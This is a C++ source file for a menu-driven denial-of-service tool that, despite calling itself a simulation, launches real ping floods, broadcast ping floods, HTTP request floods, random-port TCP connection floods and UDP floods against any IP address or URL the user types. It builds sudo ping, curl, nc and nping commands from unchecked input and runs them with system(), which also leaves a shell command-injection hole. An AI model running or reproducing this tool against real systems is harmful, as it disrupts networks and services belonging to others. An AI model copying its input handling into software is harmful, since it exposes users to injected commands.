#include <iostream>
#include <string>
#include <cstdlib>

using namespace std;

int main() {
    int choice;
    cout << "Select an attack to simulate:" << endl;
    cout << "1. Ping Flood (ICMP)" << endl;
    cout << "2. HTTP Request Flood (TCP)" << endl;
    cout << "3. Broadcast Ping Flood (ICMP)" << endl;
    cout << "4. Random Port Connection Flood (TCP)" << endl;
    cout << "5. UDP Flood (UDP)" << endl;
    cout << "Enter your choice: ";
    cin >> choice;

    long long packetCount; // Use long long for potentially large numbers
    cout << "Enter the number of packets to send (enter 0 for continuous): ";
    cin >> packetCount;

    string command;

    switch (choice) {
        case 1: { // Ping Flood (ICMP)
            string targetIP;
            cout << "Enter the target IP address: ";
            cin >> targetIP;
            if (packetCount > 0) {
                // Use -c for count. Sudo is still needed for ping options that are not standard for all users.
                command = "gnome-terminal -- bash -c 'sudo ping -c " + to_string(packetCount) + " " + targetIP + "; exec bash'";
                cout << "Starting Ping Flood (ICMP) on " << targetIP << " for " << packetCount << " packets..." << endl;
            } else {
                // Original flood option
                command = "gnome-terminal -- bash -c 'sudo ping -f " + targetIP + "; exec bash'";
                cout << "Starting continuous Ping Flood (ICMP) on " << targetIP << "..." << endl;
            }
            system(command.c_str());
            break;
        }
        case 2: { // HTTP Request Flood (TCP)
            string targetURL;
            cout << "Enter the target URL (e.g., http://example.com): ";
            cin >> targetURL;
            if (packetCount > 0) {
                command = "gnome-terminal -- bash -c 'for i in $(seq 1 " + to_string(packetCount) + "); do curl -s -o /dev/null " + targetURL + "; done; echo \"All " + to_string(packetCount) + " requests sent.\"; exec bash'";
                cout << "Starting HTTP Request Flood (TCP) on " << targetURL << " for " << packetCount << " requests..." << endl;
            } else {
                int requestRate;
                cout << "Enter the number of requests per second for continuous flood: ";
                cin >> requestRate;
                command = "gnome-terminal -- bash -c 'while true; do for i in $(seq 1 " + to_string(requestRate) + "); do curl -s -o /dev/null " + targetURL + " & done; sleep 1; done; exec bash'";
                cout << "Starting continuous HTTP Request Flood (TCP) on " << targetURL << " at " << requestRate << " requests/sec..." << endl;
            }
            system(command.c_str());
            break;
        }
        case 3: { // Broadcast Ping Flood (ICMP)
            string targetIP;
            cout << "Enter the broadcast IP address (e.g., 192.168.1.255): ";
            cin >> targetIP;
            if (packetCount > 0) {
                command = "gnome-terminal -- bash -c 'sudo ping -b -c " + to_string(packetCount) + " " + targetIP + "; exec bash'";
                cout << "Starting Broadcast Ping Flood (ICMP) on " << targetIP << " for " << packetCount << " packets..." << endl;
            } else {
                command = "gnome-terminal -- bash -c 'sudo ping -b " + targetIP + "; exec bash'";
                cout << "Starting continuous Broadcast Ping Flood (ICMP) on broadcast IP: " << targetIP << "..." << endl;
            }
            system(command.c_str());
            break;
        }
        case 4: { // Random Port Connection Flood (TCP)
            string targetIP;
            cout << "Enter the target IP address: ";
            cin >> targetIP;
            if (packetCount > 0) {
                // Connect to <packetCount> random ports
                command = "gnome-terminal -- bash -c 'for i in $(seq 1 " + to_string(packetCount) + "); do port=$(shuf -i 1-65535 -n 1); nc -zv -w1 " + targetIP + " $port; done; echo \"Completed " + to_string(packetCount) + " connection attempts.\"; exec bash'";
                cout << "Starting " << packetCount << " random port connection attempts (TCP) on " << targetIP << "..." << endl;
            } else {
                // Original: scan all ports in a loop
                command = "gnome-terminal -- bash -c 'while true; do for port in $(seq 1 65535); do nc -zv -w1 " + targetIP + " $port & done; sleep 60; done; exec bash'";
                cout << "Starting continuous Random Port Connection Flood (TCP) on " << targetIP << "..." << endl;
            }
            system(command.c_str());
            break;
        }
        case 5: { // UDP Flood (UDP)
            string targetIP;
            int udpPort, packetSize;
            cout << "Enter the target IP address: ";
            cin >> targetIP;
            cout << "Enter the UDP port to flood (e.g., 53 or 80): ";
            cin >> udpPort;
            cout << "Enter the size of each UDP packet (in bytes): ";
            cin >> packetSize;
            if (packetCount > 0) {
                command = "gnome-terminal -- bash -c 'sudo nping --udp -p " + to_string(udpPort) + " --data-length " + to_string(packetSize) + " -c " + to_string(packetCount) + " " + targetIP + "; exec bash'";
                cout << "Starting UDP Flood on " << targetIP << " port " << udpPort << " for " << packetCount << " packets..." << endl;
            } else {
                command = "gnome-terminal -- bash -c 'sudo nping --udp -p " + to_string(udpPort) + " --data-length " + to_string(packetSize) + " --rate 1000 " + targetIP + "; exec bash'";
                cout << "Starting continuous UDP Flood on " << targetIP << " port " << udpPort << "..." << endl;
            }
            system(command.c_str());
            break;
        }
        default:
            cout << "[ERROR] Invalid choice. Exiting program." << endl;
            break;
    }

    return 0;
}

